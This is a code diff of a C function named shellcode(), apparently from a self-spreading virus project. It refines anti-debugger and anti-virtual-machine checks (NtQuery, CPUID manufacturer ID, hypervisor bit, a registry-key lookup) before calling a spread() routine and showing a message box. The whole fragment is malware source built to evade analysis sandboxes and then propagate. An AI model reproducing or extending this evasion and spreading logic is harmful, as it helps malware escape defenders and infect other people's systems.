@@ -344,25 +344,33 @@ void shellcode()
     #pragma GCC diagnostic pop
     if (isDebuggerPresentBit(kernel32, _GetProcAddress) == TRUE)
     {
-
+        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
         goto EXITDOOR;
     }
     if (detectWithNTQuery(kernel32, _GetProcAddress, _LoadLibraryA))
     {
+        _MessageBoxA(NULL, aDbgDetected, NULL, 0);
         goto EXITDOOR;
     }
     if (detectCPUID_ManufactureID(kernel32, _GetProcAddress, _LoadLibraryA))
     {
-        _MessageBoxA(NULL, aDetected, NULL,0);
-        goto EXITDOOR;
+        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
+        {
+            _MessageBoxA(NULL, aVMDetected, NULL,0);
+            goto EXITDOOR;
+        }
     }
     if (detectCPUID_HypervisorBit())
     {
-        _MessageBoxA(NULL, aDetected, NULL,0);
-        goto EXITDOOR;
+        if (detectRegKey(kernel32, _GetProcAddress, _LoadLibraryA))
+        {
+            _MessageBoxA(NULL, aVMDetected, NULL,0);
+            goto EXITDOOR;
+        }
+        
     }
     spread(kernel32, _GetProcAddress, _LoadLibraryA);
-    _MessageBoxA(NULL, aOurGoal, NULL, 0); 
+    _MessageBoxA(NULL, aMSSV, NULL, 0); 
     EXITDOOR:
     return;
 }
